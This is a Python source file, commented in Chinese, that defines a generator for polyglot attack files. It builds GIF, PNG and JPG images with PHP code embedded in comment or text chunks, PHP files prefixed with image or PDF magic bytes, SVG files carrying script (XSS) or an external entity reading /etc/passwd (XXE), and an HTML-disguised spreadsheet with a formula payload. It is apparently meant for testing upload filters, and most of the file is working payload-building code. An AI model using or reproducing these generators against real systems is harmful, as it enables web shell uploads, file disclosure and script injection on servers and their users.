#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Polyglot生成器 - 生成同时是有效图片和代码的文件
"""

import io
import struct
from PIL import Image


class PolyglotGenerator:
    """Polyglot文件生成器 - 创建既是图片又是代码的文件"""
    
    def __init__(self):
        self.supported_formats = ["gif", "png", "jpg", "jpeg"]
    
    def create_gif_php(self, php_code, output_path=None):
        """创建既是GIF又是PHP的文件"""
        # GIF89a header
        gif_header = b"GIF89a"
        
        # 创建最小GIF逻辑屏幕描述符
        # 宽度: 1, 高度: 1, 无全局颜色表
        lsd = struct.pack("<HH", 1, 1) + b"\\x00\\x00\\x00"
        
        # GIF结束标记
        trailer = b"\\x3B"
        
        # 将PHP代码嵌入到GIF注释块中
        # 注释块格式: 0x21 0xFE [长度] [数据] 0x00
        comment_header = b"\\x21\\xFE"
        
        # 分割PHP代码以适应GIF注释块格式（每块最大255字节）
        php_bytes = php_code.encode('utf-8')
        comment_blocks = b""
        
        while php_bytes:
            chunk = php_bytes[:255]
            php_bytes = php_bytes[255:]
            comment_blocks += bytes([len(chunk)]) + chunk
        
        comment_blocks += b"\\x00"  # 块结束符
        
        # 组装GIF
        gif_data = gif_header + lsd + comment_header + comment_blocks + trailer
        
        if output_path:
            with open(output_path, 'wb') as f:
                f.write(gif_data)
        
        return gif_data
    
    def create_png_php(self, php_code, output_path=None):
        """创建既是PNG又是PHP的文件"""
        # PNG签名
        png_signature = b"\\x89PNG\\r\\n\\x1a\\n"
        
        # 创建IHDR块 (1x1像素)
        ihdr_data = struct.pack(">IIBBBBB", 1, 1, 8, 0, 0, 0, 0)
        ihdr_crc = self._crc32(b"IHDR" + ihdr_data)
        ihdr = struct.pack(">I", len(ihdr_data)) + b"IHDR" + ihdr_data + struct.pack(">I", ihdr_crc)
        
        # 创建tEXt块嵌入PHP代码
        # tEXt格式: [关键字] 0x00 [文本]
        keyword = "Comment"
        text_data = (keyword + "\\x00" + php_code).encode('utf-8')
        text_crc = self._crc32(b"tEXt" + text_data)
        text_chunk = struct.pack(">I", len(text_data)) + b"tEXt" + text_data + struct.pack(">I", text_crc)
        
        # 创建IDAT块 (最小压缩图像数据)
        raw_data = b"\\x00\\x00\\x00\\x00"  # 1像素的RGBA
        import zlib
        compressed = zlib.compress(raw_data)
        idat_crc = self._crc32(b"IDAT" + compressed)
        idat = struct.pack(">I", len(compressed)) + b"IDAT" + compressed + struct.pack(">I", idat_crc)
        
        # IEND块
        iend_crc = self._crc32(b"IEND")
        iend = struct.pack(">I", 0) + b"IEND" + struct.pack(">I", iend_crc)
        
        # 组装PNG
        png_data = png_signature + ihdr + text_chunk + idat + iend
        
        if output_path:
            with open(output_path, 'wb') as f:
                f.write(png_data)
        
        return png_data
    
    def create_jpg_php(self, php_code, output_path=None):
        """创建既是JPG又是PHP的文件 (使用COM注释标记)"""
        # JPEG SOI标记
        soi = b"\\xFF\\xD8"
        
        # APP0 (JFIF) 标记
        app0 = b"\\xFF\\xE0\\x00\\x10JFIF\\x00\\x01\\x01\\x00\\x00\\x01\\x00\\x01\\x00\\x00"
        
        # COM (注释) 标记嵌入PHP代码
        php_bytes = php_code.encode('utf-8')
        # COM标记格式: 0xFF 0xFE [2字节长度] [数据]
        com_length = len(php_bytes) + 2
        com_marker = b"\\xFF\\xFE" + struct.pack(">H", com_length) + php_bytes
        
        # 创建最小DQT (定义量化表)
        dqt = b"\\xFF\\xDB\\x00C\\x00" + b"\\x10" * 64
        
        # SOF0 (帧开始)
        sof0 = b"\\xFF\\xC0\\x00\\x0B\\x08\\x00\\x01\\x00\\x01\\x01\\x01\\x11\\x00"
        
        # DHT (哈夫曼表)
        dht = b"\\xFF\\xC4\\x00\\x1F\\x00\\x00\\x01\\x05\\x01\\x01\\x01\\x01\\x01\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0A\\x0B"
        
        # SOS (扫描开始)
        sos = b"\\xFF\\xDA\\x00\\x08\\x01\\x01\\x00\\x00\\x3F\\x00"
        
        # 最小图像数据
        image_data = b"\\x7F"
        
        # EOI (图像结束)
        eoi = b"\\xFF\\xD9"
        
        # 组装JPG
        jpg_data = soi + app0 + com_marker + dqt + sof0 + dht + sos + image_data + eoi
        
        if output_path:
            with open(output_path, 'wb') as f:
                f.write(jpg_data)
        
        return jpg_data
    
    def create_php_with_magic_bytes(self, php_code, image_type="gif", output_path=None):
        """在PHP代码前添加魔术字节"""
        magic_bytes = {
            "gif": b"GIF89a",
            "png": b"\\x89PNG\\r\\n\\x1a\\n",
            "jpg": b"\\xFF\\xD8\\xFF",
            "pdf": b"%PDF-1.4",
        }
        
        if image_type not in magic_bytes:
            raise ValueError(f"不支持的图片类型: {image_type}")
        
        php_bytes = php_code.encode('utf-8')
        
        # 【修复】检查用户输入是否已经包含 <?php 标签
        # 如果已经包含，直接拼接；否则添加标签
        has_php_tag = b'<?php' in php_bytes or b'<?=' in php_bytes
        
        if has_php_tag:
            # 用户已包含PHP标签，直接拼接
            data = magic_bytes[image_type] + php_bytes
        else:
            # 用户未包含PHP标签，添加标签
            data = magic_bytes[image_type] + b"<?php " + php_bytes + b" ?>"
        
        if output_path:
            with open(output_path, 'wb') as f:
                f.write(data)
        
        return data
    
    def create_svg_xss(self, payload, output_path=None):
        """创建包含XSS的SVG文件"""
        svg_template = f"""<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
    <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
    <script type="text/javascript">
        {payload}
    </script>
</svg>"""
        
        if output_path:
            with open(output_path, 'w', encoding='utf-8') as f:
                f.write(svg_template)
        
        return svg_template.encode('utf-8')
    
    def create_svg_xxe(self, external_entity, output_path=None):
        """创建包含XXE的SVG文件"""
        svg_template = f"""<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
    <!ENTITY xxe SYSTEM "{external_entity}">
]>
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
    <text>&xxe;</text>
    <rect width="300" height="100" style="fill:rgb(255,0,0)" />
</svg>"""
        
        if output_path:
            with open(output_path, 'w', encoding='utf-8') as f:
                f.write(svg_template)
        
        return svg_template.encode('utf-8')
    
    def create_excel_xls(self, formula_payload, output_path=None):
        """创建包含恶意公式的Excel文件"""
        # 简单的HTML表格格式，某些系统会将其识别为Excel
        xls_content = f"""<html xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:x="urn:schemas-microsoft-com:office:excel">
<table>
    <tr>
        <td>{formula_payload}</td>
    </tr>
</table>
</html>"""
        
        if output_path:
            with open(output_path, 'w', encoding='utf-8') as f:
                f.write(xls_content)
        
        return xls_content.encode('utf-8')
    
    def _crc32(self, data):
        """计算CRC32校验和"""
        import zlib
        return zlib.crc32(data) & 0xffffffff
    
    def get_all_polyglots(self, php_code="<?php phpinfo(); ?>"):
        """获取所有polyglot类型"""
        return {
            "gif_php": {
                "name": "GIF+PHP Polyglot",
                "generator": lambda: self.create_gif_php(php_code),
                "extension": ".gif.php",
                "description": "既是有效的GIF图片，又包含PHP代码"
            },
            "png_php": {
                "name": "PNG+PHP Polyglot",
                "generator": lambda: self.create_png_php(php_code),
                "extension": ".png.php",
                "description": "既是有效的PNG图片，又包含PHP代码"
            },
            "jpg_php": {
                "name": "JPG+PHP Polyglot",
                "generator": lambda: self.create_jpg_php(php_code),
                "extension": ".jpg.php",
                "description": "既是有效的JPG图片，又包含PHP代码"
            },
            "magic_gif": {
                "name": "GIF魔术字节+PHP",
                "generator": lambda: self.create_php_with_magic_bytes(php_code, "gif"),
                "extension": ".php",
                "description": "PHP文件前添加GIF魔术字节"
            },
            "magic_png": {
                "name": "PNG魔术字节+PHP",
                "generator": lambda: self.create_php_with_magic_bytes(php_code, "png"),
                "extension": ".php",
                "description": "PHP文件前添加PNG魔术字节"
            },
            "magic_jpg": {
                "name": "JPG魔术字节+PHP",
                "generator": lambda: self.create_php_with_magic_bytes(php_code, "jpg"),
                "extension": ".php",
                "description": "PHP文件前添加JPG魔术字节"
            },
            "magic_pdf": {
                "name": "PDF魔术字节+PHP",
                "generator": lambda: self.create_php_with_magic_bytes(php_code, "pdf"),
                "extension": ".pdf.php",
                "description": "PHP 文件前添加 PDF 签名，用于测试签名与扩展名组合校验"
            },
            "svg_xss": {
                "name": "SVG XSS",
                "generator": lambda: self.create_svg_xss("alert('XSS')"),
                "extension": ".svg",
                "description": "包含XSS payload的SVG文件"
            },
            "svg_xxe": {
                "name": "SVG XXE",
                "generator": lambda: self.create_svg_xxe("file:///etc/passwd"),
                "extension": ".svg",
                "description": "包含XXE payload的SVG文件"
            }
        }
